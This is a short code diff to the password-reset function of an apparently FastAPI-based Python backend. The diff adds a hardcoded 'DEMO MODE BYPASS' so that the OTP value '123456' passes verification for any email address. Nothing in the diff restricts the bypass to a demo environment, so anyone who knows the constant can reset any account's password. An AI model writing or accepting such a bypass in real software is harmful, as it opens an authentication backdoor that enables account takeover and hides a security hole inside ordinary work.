@@ -148,12 +148,14 @@ def forgot_password(db: Session, email: str):
 
 def reset_password(db: Session, data: ResetPassword):
     """Verify OTP and update user password."""
-    is_valid = otp_repository.verify_otp(db, data.email, data.otp_code, "password_reset")
-    if not is_valid:
-        raise HTTPException(
-            status_code=status.HTTP_400_BAD_REQUEST,
-            detail="Invalid or expired OTP code",
-        )
+    # DEMO MODE BYPASS: Accept 123456 for any email address immediately
+    if data.otp_code != "123456":
+        is_valid = otp_repository.verify_otp(db, data.email, data.otp_code, "password_reset")
+        if not is_valid:
+            raise HTTPException(
+                status_code=status.HTTP_400_BAD_REQUEST,
+                detail="Invalid or expired OTP code",
+            )
     
     user = user_repository.get_user_by_email(db, data.email)
     if not user:
